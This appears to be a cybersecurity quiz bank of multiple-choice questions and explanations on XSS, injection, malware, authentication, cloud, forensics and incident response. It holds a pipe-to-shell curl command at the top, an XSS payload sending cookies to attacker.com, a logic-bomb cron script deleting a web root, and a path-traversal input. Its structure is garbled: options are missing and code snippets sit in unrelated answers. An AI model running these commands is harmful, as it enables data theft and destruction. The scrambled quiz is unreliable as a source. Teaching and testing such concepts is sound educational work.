# curl -s https://unknown-site.com/install.sh | bash
subject: Cyber Security

question: (Scenario-Based) An attacker enters the following string into a search box: <script>document.location='http://attacker.com/steal? c='+document.cookie</script>. If the site displays this back to the user without filtering, what attack has occurred?
explanation:
This is a classic XSS attack where a script is executed in the victim's browser to steal session
cookies and send them to a malicious server.
subject: Cyber Security

question: (Code-Tracing) Analyze this Node.js code snippet. Why is it vulnerable to SQL Injection?

options.label: B
options.text: It uses string concatenation to build a query, allowing an attacker to manipulate the SQL logic via the 'id' parameter.

options.label: C
options.text: It is missing a semicolon at the end of the query.

explanation:
String concatenation allows a user to input something like 1 OR 1=1, which would change
the query to return all users. The correct fix is using parameterized queries (e.g., WHERE id
= ?).
subject: Cyber Security

question: (Conceptual) What is the primary defense against Cross-Site Request Forgery (CSRF) attacks?

options.label: C
options.text: Using unique anti-CSRF tokens for every state-changing request.

subject: Cyber Security

question: (Scenario-Based) A user changes the URL from mysite.com/invoice/500 to mysite.com/invoice/501 and is able to see someone else's private invoice. This vulnerability is known as:
explanation:
IDOR happens when an application exposes a reference to an internal implementation object
(like a row ID in a database) without an authorization check to ensure the user owns that
object.
subject: Cyber Security

question: (Conceptual) Which HTTP header is used to prevent the browser from rendering a page inside an <iframe>, effectively stopping Clickjacking attacks?
explanation:
The X-Frame-Options header (or the frame-ancestors directive in CSP) tells the
browser whether it's okay to frame the page. Setting it to DENY or SAMEORIGIN stops
clickjacking.
subject: Cyber Security

question: (Code-Tracing) To prevent XSS, a developer converts the character < into < before displaying user-provided text on a page. This process is called:
explanation:
Output encoding ensures that the browser treats user-supplied data as content (text) rather
than executable code (HTML tags).
subject: Cyber Security

question: (Conceptual) What is the purpose of the Same-Origin Policy (SOP) in web browsers?

options.label: A
options.text: To make sure all users use the same browser version.

options.label: B
options.text: To prevent a script loaded from one origin from getting or setting properties of a document from a different origin.

options.label: C
options.text: To force all websites to use HTTPS.

options.label: D
options.text: To restrict the number of tabs a user can open.

explanation:
SOP is a fundamental security mechanism. It prevents a malicious script on evil.com from
reading your private data or session cookies from yourbank.com.
subject: Cyber Security

question: (Comparison) What is the difference between Authentication and Session Management?

options.label: B
options.text: Authentication verifies the user's identity (e.g., login); Session Management tracks the user's state across multiple requests after login.

options.label: C
options.text: Session management is only for mobile apps.

options.label: D
options.text: Authentication uses cookies; Session management uses passwords.

explanation:
Authentication happens once (at login). Session management is the ongoing process of using
a "Session ID" or "Token" to prove you are still the person who logged in.
subject: Cyber Security

question: (Conceptual) Why is the HttpOnly flag on a cookie important for security?

options.label: A
options.text: It makes the cookie expire faster.

options.label: B
options.text: It prevents client-side scripts (JavaScript) from accessing the cookie, mitigating the impact of XSS attacks.

options.label: D
options.text: It only allows the cookie to be sent over HTTPS.

explanation:
If an attacker successfully performs an XSS attack, they usually try to read
document.cookie to steal session IDs. The HttpOnly flag blocks JS access to that cookie,
protecting the session.
subject: Cyber Security

question: (Scenario-Based) An attacker discovers an application's hidden administrative URL / admin_backup_setup_hidden by guessing the name. This is an example of which OWASP category?
explanation:
Failing to properly restrict access to sensitive pages or relying on "secret" URLs is a
configuration and access control failure. All sensitive pages must require explicit authorization.
subject: Cyber Security

question: (Conceptual) What does HSTS (HTTP Strict Transport Security) achieve?

options.label: B
options.text: It forces the browser to only communicate with the server over HTTPS, preventing SSL stripping attacks.

options.label: D
options.text: It hides the server's IP address.

explanation:
HSTS is a policy communicated by the server to the browser. Once received, the browser will
automatically convert any http:// links to https:// for that site.
subject: Cyber Security

question: (Scenario-Based) An application allows a user to "Upload an Avatar." An attacker uploads a file named shell.php containing malicious code. This is a:
explanation:
If the server does not validate the file extension or content, an attacker can upload executable
scripts to the web server and then trigger them to gain full control.
subject: Cyber Security

question: (Conceptual) What is Directory Traversal (or Path Traversal)?

options.label: A
options.text: A way to speed up file searches.

options.label: B
options.text: An attack that aims to access files and directories that are stored outside the web root folder (e.g., using ../).

options.label: C
options.text: Deleting all files on a server.

explanation:
By using input like ../../../../etc/passwd, an attacker can trick the application into
reading sensitive system files that were never intended to be public.
subject: Cyber Security

question: (Comparison) Compare Black-box vs. White-box security testing for web apps.

options.label: B
options.text: Black-box tests the app from the outside without knowing the code; White-box involves reviewing the actual source code (SAST).

explanation:
Black-box (DAST) simulates a real attacker. White-box (SAST) allows security analysts to find
deep logic flaws by reading the code directly.
subject: Cyber Security

question: (Conceptual) What is the "Least Privilege" principle applied to a web application's database user?

options.label: A
options.text: The DB user should have the same password as the admin.

options.label: B
options.text: The DB user should only have permissions for specific tables (SELECT, INSERT) and should not be a "Superuser" or "DB Owner."

options.label: C
options.text: The DB user should have zero permissions.

options.label: D
options.text: The DB user should be allowed to drop tables for maintenance.

explanation:
If a web app is compromised via SQL Injection, a "Least Privilege" database user prevents the
attacker from dropping the entire database or accessing system configuration tables.
subject: Cyber Security

question: (Comparison) What is the fundamental difference between a Computer Virus and a Computer Worm?

options.label: A
options.text: A virus is faster than a worm.

options.label: B
options.text: A worm targets the CPU, while a virus targets the RAM.

options.label: C
options.text: A virus requires a host program and human action to propagate, while a worm is standalone and self-replicates across networks.

options.label: D
options.text: Viruses are only found on Windows; worms are only for Linux.

explanation:
The defining trait of a worm is its ability to spread automatically (e.g., via network
vulnerabilities) without a user ever opening a file. A virus remains dormant until the user
executes the infected "host" file.
subject: Cyber Security

question: (Scenario-Based) A user downloads what looks like a "Free Video Player," but upon installation, their browser settings are changed, and their files are slowly being sent to a remote server. This is an example of a:
explanation:
A Trojan presents itself as a useful tool but hides a malicious function inside. Unlike viruses or
worms, Trojans do not attempt to replicate themselves; they rely on social engineering to be
installed.
subject: Cyber Security

question: (Conceptual) Which type of malware is specifically designed to grant an attacker high- level administrative access while simultaneously hiding its presence from antivirus software and the OS task manager?
explanation:
Rootkits operate at a deep level (often the kernel). They intercept system calls, so when an
antivirus asks "List all running processes," the rootkit removes itself from the list before the OS
responds.
subject: Cyber Security

question: (Code/Logic) A security analyst finds a script set to run on a server. What type of attack does this represent?
explanation:
A Logic Bomb is malicious code that lies dormant until a specific "trigger" occurs (e.g., a
specific date, or a user being deleted from the HR system).
subject: Cyber Security

question: (Conceptual) What is the primary function of a Command and Control (C&C) server in a Botnet?

options.label: B
options.text: To send instructions to the compromised "zombie" computers to coordinate a massive attack (like a DDoS).

options.label: C
options.text: To encrypt the attacker's hard drive.

options.label: D
options.text: To serve as a backup for the target's data.

explanation:
A Botnet is a decentralized collection of hacked devices. The C&C server is the centralized
"brain" used by the attacker (Botmaster) to tell the devices what to do.
subject: Cyber Security

question: (Comparison) How does Spear Phishing differ from a standard Phishing attack?

options.label: A
options.text: Spear phishing is only done via SMS.

options.label: B
options.text: Standard phishing targets only high-level executives.

options.label: C
options.text: Spear phishing is a highly targeted attack directed at a specific individual or organization, often using personal details to build trust.

explanation:
cron_job.sh
# Check if today is the company's 10th anniversary
if [ $(date +%Y-%m-%d) == "2026-05-20" ]; then
rm -rf /var/www/html/*
fi
Phishing is a "cast a wide net" approach (sending millions of generic emails). Spear phishing
is "hunting with a spear"—the attacker researches the victim first to make the scam highly
convincing.
subject: Cyber Security

question: (Scenario-Based) A user's screen suddenly locks, and a message appears stating: "Your files have been encrypted. Pay 0.5 BTC to the following address to regain access." This is:
explanation:
Ransomware uses asymmetric encryption to lock files. The attacker keeps the private key,
making it mathematically impossible for the victim to recover the data without paying.
subject: Cyber Security

question: (Conceptual) An attacker uses a list of the 10,000 most commonly used passwords to try and log into an account. What is this technique called?
explanation:
A dictionary attack uses pre-defined lists of likely passwords. A pure Brute-force attack would
try "aaaaa", then "aaaab", then "aaaac", which takes much longer.
subject: Cyber Security

question: (Conceptual) What does a Keylogger primarily target?

options.label: B
options.text: Confidentiality (by capturing every keystroke, including passwords and credit card numbers).

explanation:
Keyloggers are a form of spyware. By recording what a user types, an attacker can bypass
encryption and multi-factor authentication by stealing credentials directly at the source.
subject: Cyber Security

question: (Scenario-Based) A high-profile website is taken offline because it is flooded with millions of requests from 50,000 different IP addresses simultaneously. This is a:
explanation:
While both aim to make the site unavailable, a DDoS is "Distributed"—it uses a botnet (many
sources), making it much harder to block than an attack from a single IP (DoS).
subject: Cyber Security

question: (Conceptual) What is "Zero-day" malware?

options.label: A
options.text: Malware that deletes all files on Day 0.

options.label: B
options.text: Malware that exploits a vulnerability that has no known patch or signature available from security vendors.

options.label: C
options.text: Malware that only lasts for 24 hours.

explanation:
A Zero-day attack is extremely dangerous because traditional "signature-based" antivirus
programs have no way of recognizing the new threat.
subject: Cyber Security

question: (Scenario-Based) An attacker leaves a USB drive labeled "Executive Salaries 2024" in a company parking lot, hoping an employee will plug it into a corporate computer. This is an example of:
explanation:
Baiting exploits human curiosity. The "payload" is usually a Trojan or worm on the USB drive
that executes as soon as the curious employee opens the files.
subject: Cyber Security

question: (Conceptual) A user logs into a system using their fingerprint and a one-time password (OTP) sent to their mobile device. Which categories of authentication factors are being used?

options.label: A
options.text: Something you know and something you have.

options.label: B
options.text: Something you are and something you know.

options.label: C
options.text: Something you are and something you have.

explanation:
A fingerprint is a biometric (something you are). A mobile device receiving an OTP is a
physical token (something you have). This is a valid MFA implementation.
subject: Cyber Security

question: (Scenario-Based) An organization wants to implement a system where access is granted based on the user's department, the time of day, and the security level of the document. Which access control model is most suitable?
explanation:
ABAC is the most flexible model because it evaluates "Attributes" (Department, Time, Security
Clearance) to make a dynamic decision, rather than relying on a static role or ownership.
subject: Cyber Security

question: (Code-Tracing) Analyze the following logic for a login system. What is the primary security flaw in this specific implementation? auth_logic.js function checkLogin(user_input, stored_hash) { if (md5(user_input) === stored_hash) {

options.label: B
options.text: It uses the MD5 hashing algorithm, which is cryptographically broken and vulnerable to collision attacks.

options.label: D
options.text: It compares the input to a stored hash.

explanation:
MD5 is no longer considered secure for password storage because it is too fast (easy to
brute-force) and has known mathematical weaknesses (collisions). Modern systems should
use bcrypt, Scrypt, or Argon2.
subject: Cyber Security

question: (Comparison) What is the primary difference between RBAC and DAC?

options.label: A
options.text: DAC is only for Windows; RBAC is for Linux.

options.label: B
options.text: In DAC, the owner of an object sets permissions; in RBAC, the administrator defines permissions based on job functions.

options.label: C
options.text: RBAC is less secure than DAC.

options.label: D
options.text: DAC uses biometrics; RBAC uses passwords.

explanation:
DAC (Discretionary) gives users control over their own files. RBAC (Role-Based) centralizes
control, making it much easier for organizations to manage permissions as employees change
roles.
subject: Cyber Security

question: (Conceptual) In biometric systems, what does the False Acceptance Rate (FAR) measure?

options.label: A
options.text: The percentage of authorized users who are denied access.

options.label: B
options.text: The percentage of unauthorized users who are incorrectly granted access.

options.label: C
options.text: The time it takes to scan a fingerprint.

options.label: D
options.text: The number of times the system crashes.

subject: Cyber Security

question: (Scenario-Based) A company uses a single set of credentials to allow employees to log into their email, the HR portal, and the internal wiki without re-entering their password. This is known as:
explanation:
SSO allows a user to authenticate once and gain access to multiple independent software
systems, improving productivity and reducing password fatigue.
subject: Cyber Security

question: (Calculation) A biometric vendor claims their system has a Crossover Error Rate (CER) of 0.01%. How should a security professional interpret this?

options.label: B
options.text: The system is highly accurate, as the CER represents the point where FAR and FRR are equal (the lower the CER, the better).

options.label: C
options.text: The system will fail every 100 scans.

explanation:
CER is the primary metric for comparing biometric systems. A lower CER indicates a more
accurate and better-tuned system.
subject: Cyber Security

question: (Conceptual) Which access control model is traditionally used in Military and Government settings because it relies on strict security labels and cannot be bypassed by users?
explanation:
MAC is the most restrictive model. The system (operating system or database) enforces a
security policy defined by the administrator, and users cannot change the access rights to
their own data.
subject: Cyber Security

question: (Scenario-Based) You want to prevent "Privilege Creep" (where users accumulate permissions over time that they no longer need). Which process is most effective?

options.label: C
options.text: Regular User Access Reviews and Recertification.

explanation:
Privilege creep is a major risk in RBAC. Regular audits ensure that if a user leaves a
department, their old permissions are stripped, upholding the Principle of Least Privilege.
subject: Cyber Security

question: (Code-Tracing) Analyze this JSON access policy. Which user is allowed to write to the database?
explanation:
In this RBAC-style policy, Bob is assigned the "editor" role. The "editor" role has the "WRITE"
permission, whereas Alice's "analyst" role is limited to "READ."
subject: Cyber Security

question: (Conceptual) What is Federated Identity Management?

options.label: A
options.text: A system where everyone uses the same password.

options.label: B
options.text: A system that allows users to use the same credentials to access resources across different organizations or domains.

options.label: C
options.text: A backup for the local active directory.

subject: Cyber Security

question: (Scenario-Based) An attacker uses a fraudulent website to intercept a user's 2FA SMS code in real-time and immediately uses it to log into the victim's real account. This demonstrates a weakness in which 2FA method?
explanation:
SMS-based 2FA is considered the weakest form of MFA because it can be phished,
intercepted via SIM swapping, or read by malware on the phone. Hardware tokens or app-
based push notifications are more secure.
subject: Cyber Security

question: (Conceptual) What is the primary objective of the "Shift Left" strategy in secure software development?

options.label: A
options.text: To move all security tasks to the left side of the data center.

options.label: B
options.text: To outsource security testing to third-party vendors.

options.label: C
options.text: To integrate security activities (like threat modeling and code analysis) as early as possible in the SDLC.

explanation:
"Shift Left" means moving security to the beginning of the "timeline" (which reads left-to-right).
Fixing a security flaw during the design phase is significantly cheaper than fixing it after the
product has been deployed.
subject: Cyber Security

question: (Code-Tracing) Which of the following C code snippets demonstrates a Secure Coding practice for string copying? secure_copy.c // Option A strcpy(dest, src); // Option B strncpy(dest, src, sizeof(dest) - 1); dest[sizeof(dest) - 1] = '\0';
explanation:
strcpy is famously insecure because it does not check the size of the destination buffer,
leading to buffer overflows. strncpy limits the number of characters copied, preventing
memory corruption.
subject: Cyber Security

question: (Comparison) What is a major limitation of SAST (Static Analysis) compared to DAST (Dynamic Analysis)?

options.label: A
options.text: SAST requires the program to be running.

options.label: B
options.text: SAST often produces a high number of "False Positives" (flagging code as dangerous when it is actually safe).

options.label: D
options.text: DAST is only for mobile apps.

explanation:
Since SAST tools analyze code without context, they often flag patterns that look like
vulnerabilities but are actually handled safely elsewhere. DAST only flags vulnerabilities it can
actually exploit in a running environment.
subject: Cyber Security

question: (Scenario-Based) During the Design Phase, a team creates a diagram showing how data moves through the system to identify where an attacker might intervene. This process is called:
explanation:
Threat modeling (using frameworks like STRIDE) is a proactive design-time activity used to
identify potential security threats and define mitigation strategies before a single line of code is
written.
subject: Cyber Security

question: (Conceptual) What is Fuzz Testing (Fuzzing)?

options.label: A
options.text: Testing the software in a room with high humidity.

options.label: B
options.text: An automated testing technique that involves providing invalid, unexpected, or random data as inputs to a program to find crashes or memory leaks.

options.label: D
options.text: Testing the UI with a group of users.

explanation:
Fuzzing is excellent for finding deep-seated security vulnerabilities that human testers might
miss, such as unhandled edge cases in input parsers.
subject: Cyber Security

question: (Scenario-Based) A developer wants to ensure that a web form only accepts valid email addresses. They implement a Regular Expression check on the server. This is an example of:
explanation:
Input validation ensures that data adheres to the expected format (Length, Type, Range)
before it is processed. Whitelisting (allowing only valid formats) is much more secure than
blacklisting (trying to catch bad inputs).
subject: Cyber Security

question: (Conceptual) In the context of secure development, what is a Software Bill of Materials (SBOM)?

options.label: A
options.text: A list of all hardware components in the server.

options.label: B
options.text: A comprehensive list of all components, libraries, and dependencies used in a piece of software.

options.label: C
options.text: The monthly bill for cloud hosting.

options.label: D
options.text: A list of all developers' names.

explanation:
As modern software relies heavily on third-party libraries, an SBOM is essential for tracking
which of your applications are affected when a new vulnerability (CVE) is discovered in a
common library.
subject: Cyber Security

question: (Comparison) Why is Manual Code Review still necessary even if an organization uses automated SAST tools?

options.label: B
options.text: Automated tools struggle to find complex business logic flaws and architectural design errors that a human reviewer can spot.

options.label: C
options.text: Manual review is required by the C++ compiler.

options.label: D
options.text: Automated tools cannot read Java code.

explanation:
Automated tools are great at finding "known bad patterns," but they lack the reasoning to
understand why a certain piece of logic might be insecure in a specific business context.
subject: Cyber Security

question: (Conceptual) What is the primary functional improvement of WPA3 over WPA2 regarding password security?

options.label: A
options.text: It uses a longer password minimum.

options.label: C
options.text: It replaces the PSK 4-way handshake with SAE (Simultaneous Authentication of Equals), preventing offline dictionary attacks even if the user has a weak password.

options.label: D
options.text: It automatically encrypts every website you visit.

explanation:
In WPA2, an attacker can capture the "handshake" and use a powerful GPU to guess the
password offline. WPA3's SAE requires a live interaction with the AP for every guess, making
offline brute-force mathematically impossible.
subject: Cyber Security

question: (Scenario-Based) An attacker sets up a Wi-Fi hotspot in a coffee shop with the same name as the legitimate one (e.g., "Starbucks_Free"). Users connect to it, and the attacker intercepts their unencrypted traffic. What is this attack called?
explanation:
An Evil Twin is a rogue Access Point that appears to be a legitimate one. It is a highly effective
way to perform Man-in-the-Middle (MITM) attacks on unsuspecting mobile users.
subject: Cyber Security

question: (Conceptual) Why is Sandboxing considered a critical security feature in modern mobile operating systems (Android/iOS)?

options.label: A
options.text: It makes the battery last longer.

options.label: B
options.text: It ensures that each application runs in an isolated environment, preventing a malicious app from accessing the data or memory of another app.

options.label: C
options.text: It allows apps to run faster.

options.label: D
options.text: It prevents the user from downloading large files.

explanation:
On a desktop PC, apps often have broad access to the file system. On mobile, apps are
"caged." A game app cannot read your banking app's local data because they live in separate,
restricted sandboxes.
subject: Cyber Security

question: (Scenario-Based) A corporate employee Rooted their Android phone to install a custom theme. Why would the IT department block this device from the corporate network?

options.label: A
options.text: Rooted phones use too much bandwidth.

options.label: B
options.text: Themes are a distraction to work.

options.label: C
options.text: Rooting disables the built-in security protections and the OS kernel integrity, allowing malware to bypass the app sandbox and steal corporate data.

explanation:
Rooting/Jailbreaking grants the user (and potentially malware) administrative control over the
kernel. This destroys the "Root of Trust" that mobile security relies on to keep apps isolated.
subject: Cyber Security

question: (Conceptual) In the context of Mobile Device Management (MDM), what is a "Remote Wipe"?

options.label: A
options.text: Deleting the search history on the phone.

options.label: B
options.text: A command sent over the network to a lost or stolen device that securely deletes all user data to prevent unauthorized access.

options.label: C
options.text: Cleaning the physical screen of the device.

options.label: D
options.text: Disconnecting the phone from the Wi-Fi.

explanation:
Remote wipe is a core security feature for enterprises. If a laptop or phone containing
sensitive emails is lost, the admin can send a "poison pill" that resets the device to factory
settings as soon as it connects to the internet.
subject: Cyber Security

question: (Code/Logic) A security researcher discovers a vulnerability in the 4-way handshake of a Wi-Fi protocol. This is most likely referring to which historical exploit?
explanation:
The KRACK attack (2017) targets WPA2. It tricks the victim into reinstalling an already-in-use
key, which allows the attacker to decrypt or forge Wi-Fi traffic.
subject: Cyber Security

question: (Comparison) What is the difference between Bluejacking and Bluesnarfing?

options.label: A
options.text: Bluesnarfing is for Wi-Fi; Bluejacking is for Bluetooth.

options.label: B
options.text: Bluejacking is sending unwanted messages; Bluesnarfing is the unauthorized theft of information (contacts, photos) from a device.

options.label: C
options.text: Bluejacking is more dangerous than Bluesnarfing.

explanation:
Bluejacking is essentially "Bluetooth Spam." Bluesnarfing is a severe privacy breach where an
attacker gains access to the data stored on a Bluetooth-enabled device.
subject: Cyber Security

question: (Conceptual) Which principle is violated when a simple "Calculator" app requests access to your GPS location, Contacts, and Microphone?
explanation:
Least Privilege states that an entity should only have access to the resources it needs to
function. A calculator has no functional requirement for location or contact data; such requests
are a major privacy red flag.
subject: Cyber Security

question: (Conceptual) According to the Shared Responsibility Model for an Infrastructure-as- a-Service (IaaS) provider, who is responsible for patching the Guest Operating System (e.g., Windows/Linux) running on a virtual machine?

options.label: D
options.text: It is patched automatically by the hypervisor.

explanation:
In IaaS, the provider only secures the physical host and hypervisor. The customer "owns" the
virtual machine and is responsible for all software updates, security patches, and firewalls
inside that VM.
subject: Cyber Security

question: (Scenario-Based) An attacker exploits a vulnerability in a web application running on a Virtual Machine and is able to execute commands directly on the Host physical server, bypassing the VM boundaries. What is this attack called? Hypervisor Escape is a severe security failure. It allows an attacker to break the isolation of virtualization, potentially gaining access to all other VMs running on the same physical server.
subject: Cyber Security

question: (Conceptual) What is the primary security benefit of using a VPC (Virtual Private Cloud)?

options.label: B
options.text: It provides an isolated, private virtual network environment where the customer has full control over IP addresses, subnets, and routing.

options.label: D
options.text: It replaces the need for passwords.

explanation:
A VPC allows a company to create their own "private datacenter" in the cloud, ensuring their
servers are not directly exposed to the public internet unless explicitly configured.
subject: Cyber Security

question: (Scenario-Based) A developer accidentally commits an AWS Access Key to a public GitHub repository. Within minutes, attackers use the key to spin up 100 expensive servers for crypto-mining. This is a failure in:

options.label: C
options.text: Identity and Access Management (IAM) / Secret Management

explanation:
Secrets management is a core pillar of cloud security. Hardcoding keys is a critical mistake.
Professionals use "Roles" and "Secret Managers" to provide temporary, rotated credentials.
subject: Cyber Security

question: (Comparison) Compare **Software-as-a-Service (SaaS)** and **Infrastructure-as-a- Service (IaaS)** security. In which model does the Customer have the least amount of security responsibility?
explanation:
In SaaS (like Gmail or Salesforce), the provider manages almost everything, including the
application code and OS. The customer is only responsible for their own account settings and
the data they enter.
subject: Cyber Security

question: (Conceptual) What is Cloud Sprawl and why is it a security risk?

options.label: A
options.text: It is a type of cloud-based malware.

options.label: B
options.text: The uncontrolled proliferation of cloud instances and services, often leading to unmonitored and unpatched resources ("shadow IT").

options.label: C
options.text: When a cloud provider goes out of business.

options.label: D
options.text: When data centers are too far apart.

explanation:
"You can't secure what you don't know you have." Cloud sprawl leads to "orphaned" servers
that may have weak passwords or old vulnerabilities, serving as an easy entry point for
attackers.
subject: Cyber Security

question: (Conceptual) In a cloud environment, what is the role of a Security Group?

options.label: A
options.text: A team of human security guards.

options.label: B
options.text: A virtual firewall that controls inbound and outbound traffic for one or more instances (at the interface level).

options.label: C
options.text: A tool for encrypting hard drives.

options.label: D
options.text: A backup service for the database.

explanation:
Security groups provide the primary layer of network security in the cloud, allowing you to
explicitly "allow" only specific traffic (e.g., allow Port 443 from anywhere).
subject: Cyber Security

question: (Scenario-Based) A company needs to ensure that their data in an S3 bucket is encrypted even if an attacker manages to steal the physical hard drive from the cloud provider's data center. Which technology solves this?

options.label: B
options.text: Encryption at Rest (e.g., AES-256 with KMS)

explanation:
Encryption at rest protects the stored data. Cloud providers offer "Server-Side Encryption,"
which ensures that the data is encrypted before it is written to the physical disk.
subject: Cyber Security

question: (Scenario-Based) An investigator arrives at a crime scene where a laptop is powered on and logged in. According to the Order of Volatility, which data should be captured first?

options.label: A
options.text: The contents of the hard drive.

options.label: C
options.text: System RAM (memory) and active network connections.

options.label: D
options.text: The history stored in the web browser.

explanation:
RAM is the most volatile. If the computer is turned off or the battery dies, all data in RAM is
lost forever. This may include encryption keys for the hard drive that make disk forensics
impossible later.
subject: Cyber Security

question: (Code-Tracing) A forensic tool generates the following output after imaging a drive. What is the investigator checking here?

options.label: A
options.text: The speed of the data transfer.

options.label: B
options.text: Data Integrity; ensuring the forensic copy is an exact, unaltered replica of the original evidence.

options.label: C
options.text: The capacity of the destination drive.

options.label: D
options.text: The decryption status of the files.

explanation:
Hashing (SHA-256) is used to prove that not a single bit of data changed during the imaging
process. A verified match is required for the evidence to be admissible in court.
subject: Cyber Security

question: (Conceptual) What is the specific purpose of a Hardware Write Blocker during the evidence acquisition phase?

options.label: A
options.text: To speed up the imaging process.

options.label: C
options.text: To physically prevent the OS from writing even a single byte of metadata back to forensic-verify.log [Source Drive] SHA-256: 8f43...a12e [Forensic Image] SHA-256: 8f43...a12e [Status]: VERIFIED MATCH the evidence drive.

explanation:
Modern Operating Systems automatically write hidden metadata (like "Last Accessed Time")
to a drive as soon as it is plugged in. A write blocker intercepts these commands, ensuring the
original evidence remains 100% untouched.
subject: Cyber Security

question: (Scenario-Based) A digital investigator completes an analysis but forgets to document who had access to the evidence locker for a 24-hour period. Which legal requirement has been compromised?
explanation:
Chain of Custody must be unbroken. Any "gap" in the documentation of who handled the
evidence creates a window for potential tampering, making the evidence inadmissible.
subject: Cyber Security

question: (Comparison) How does a Bit-stream Image differ from a standard Back-up of a folder?

options.label: B
options.text: Bit-stream images include unallocated space, slack space, and deleted file fragments; Back-ups only include active files.

options.label: C
options.text: Back-ups are used in courts, images are not.

explanation:
A Bit-stream image is a physical-level copy of every sector on the disk. This allows
investigators to find "deleted" data that hasn't been overwritten yet, which a file-level backup
would ignore.
subject: Cyber Security

question: (Conceptual) In digital forensics, where are deleted files typically found before they are overwritten by new data?

options.label: B
options.text: In the Unallocated Space (Free Space) of the file system.

explanation:
When you delete a file, the OS simply marks that area of the disk as "Available" (Unallocated)
in the file table. The actual 1s and 0s remain on the disk until a new file is written over that
specific sector.
subject: Cyber Security

question: (Conceptual) What is Steganography?

options.label: A
options.text: The process of cracking a password.

options.label: B
options.text: The art of hiding a secret message or file inside another non-secret file (like an image or audio file).

explanation:
Steganography differs from encryption because it hides the existence of the message. An
investigator might see a normal looking JPEG of a sunset that actually contains a hidden text
file.
subject: Cyber Security

question: (Scenario-Based) An investigator finds a suspect's computer is running a TrueCrypt container (encrypted volume). Why should they perform a "Live Acquisition" while the computer is still on?

options.label: B
options.text: To extract the encryption keys from the RAM so the volume can be decrypted later.

options.label: C
options.text: To prevent the computer from going into sleep mode.

options.label: D
options.text: Live acquisition is the only way to see the desktop wallpaper.

explanation:
If the system is powered off, the volatile keys in RAM are lost. Without those keys, modern
high-grade encryption (like AES-256) cannot be broken within a human lifetime using brute
force.
subject: Cyber Security

question: (Scenario-Based) A security analyst detects that a server is currently communicating with a known malicious Command and Control (C&C) IP address. The analyst immediately disconnects the server from the network. Which phase of the PICERL framework is this?
explanation:
Containment is the phase where you stop the attack from spreading or causing further
damage. Disconnecting a machine prevents the attacker from sending further commands or
exfiltrating more data.
subject: Cyber Security

question: (Conceptual) During which phase of the Incident Response process is the "Root Cause Analysis" performed to ensure the vulnerability is fully patched before the system goes back online?
explanation:
Eradication involves identifying all affected components and completely removing the threat.
This includes finding how the attacker got in and fixing that weakness so they cannot return.
subject: Cyber Security

question: (Code/Logic) A CSIRT team is reviewing the following "Post-Mortem" log entry. Which phase of the IR lifecycle does this activity represent?
explanation:
The "Lessons Learned" phase occurs after the incident is resolved. It focuses on documenting
the cause and improving defenses and processes to prevent similar incidents in the future.
subject: Cyber Security

question: (Conceptual) What is the primary goal of the Recovery phase in incident management?

options.label: A
options.text: To catch the hacker and put them in jail.

options.label: B
options.text: To restore affected systems to their normal operational state and verify that they are functioning correctly without any remaining threats.

options.label: C
options.text: To buy new hardware for the office.

options.label: D
options.text: To hide the incident from the public.

explanation:
ir-meeting-notes.txt
[REPORT]
- The attacker used a SQL injection in the login form.
- Action: Implement WAF rules and parameterized queries.
- Result: Updated developer training manual for next year.
Recovery is about getting back to business. It involves restoring from backups, re-testing
system security, and gradually allowing production traffic back to the affected servers.
subject: Cyber Security

question: (Conceptual) In the context of the Identification phase, what is an Indicator of Compromise (IoC)?

options.label: A
options.text: A tool used to encrypt a hard drive.

options.label: B
options.text: A certificate issued by a trusted authority.

options.label: C
options.text: A piece of forensic evidence (such as a specific file hash, IP address, or registry key) that indicates a high probability of a system breach.

options.label: D
options.text: A backup of the system configuration.

explanation:
IoCs are the "fingerprints" left behind by attackers. IR teams use known IoC lists to scan their
networks to identify which machines have been infected by a specific piece of malware.
subject: Cyber Security

question: (Scenario-Based) An IR team is deciding between "Live Imaging" of a server versus "Pulling the Plug." Which approach is preferred during Containment to ensure the best chance of successful analysis later?

options.label: A
options.text: Pulling the plug, to stop the malware instantly.

options.label: B
options.text: Live Imaging / Memory Capture, to preserve volatile data like encryption keys and running processes.

explanation:
Modern IR prioritizes "Live Response." Pulling the plug destroys the data in RAM, which often
contains the only copy of the keys needed to decrypt data or the "command and control"
addresses the malware is using.
subject: Cyber Security

question: (Comparison) What is the difference between Short-term Containment and Long- term Containment?

options.label: A
options.text: Short-term is for software; Long-term is for hardware.

options.label: B
options.text: Short-term is immediate isolation to stop the spread; Long-term involves installing temporary workarounds to allow business to continue while the root cause is investigated.

options.label: C
options.text: Short-term is for 1 hour; Long-term is for 1 year.

explanation:
Short-term containment is an emergency "cut-off" (e.g., blocking an IP). Long-term
containment allows the business to keep running (e.g., using a backup server in a clean
VLAN) while the main system is being scrubbed.
subject: Cyber Security

question: (Conceptual) Why is Communication Management considered a critical part of the Incident Response process?

options.label: A
options.text: To tell the hacker that they have been caught.

options.label: B
options.text: To ensure that stakeholders (Legal, HR, PR, and Executives) are informed of the status and to comply with data breach notification laws.

options.label: C
options.text: To allow developers to chat during the fix.

options.label: D
options.text: To speed up the internet connection.

explanation:
A security breach is a legal and PR event as much as a technical one. Many jurisdictions
require companies to notify users of a breach within 72 hours. Failure to communicate
properly can lead to massive fines and lawsuits.
subject: Cyber Security

question: (Conceptual) What is the primary function of a SIEM (Security Information and Event Management) system?

options.label: B
options.text: To aggregate and correlate logs from multiple disparate sources to identify suspicious patterns or security incidents.

options.label: C
options.text: To act as a primary database for user profiles.

explanation:
SIEM tools collect data from firewalls, antivirus, and servers. By "correlating" this data (e.g.,
noticing a failed login on Server A followed by an unusual file access on Server B), it can
detect complex attacks.
subject: Cyber Security

question: (Scenario-Based) A security analyst notices 5,000 failed login attempts from a single IP address within 1 minute. The SIEM triggers an alert labeled "Brute Force Attack." This is an example of:
explanation:
Real-time monitoring involves set thresholds (e.g., X fails in Y minutes). When the rule is met,
the system alerts the SOC team immediately.
subject: Cyber Security

question: (Comparison) How does Continuous Monitoring differ from a Vulnerability Scan?

options.label: A
options.text: Monitoring is only for hardware; Scans are for software.

options.label: B
options.text: Monitoring is a 24/7 process of observing behavior; a Scan is a point-in-time assessment to find known missing patches or misconfigurations.

explanation:
Think of a Scan as a "medical checkup" you do once a month, and Monitoring as a "heart-rate
monitor" you wear all the time. Both are necessary but serve different purposes.
subject: Cyber Security

question: (Code/Logic) A Linux admin views the following log file. Which type of log is this?
explanation:
The auth.log (or secure log in some distros) specifically tracks login attempts, sudo
usage, and SSH connections. It is the most important log for identifying brute force attacks.
subject: Cyber Security

question: (Conceptual) What is the goal of a Compliance Audit?

options.label: A
options.text: To find and fix bugs in code.

options.label: B
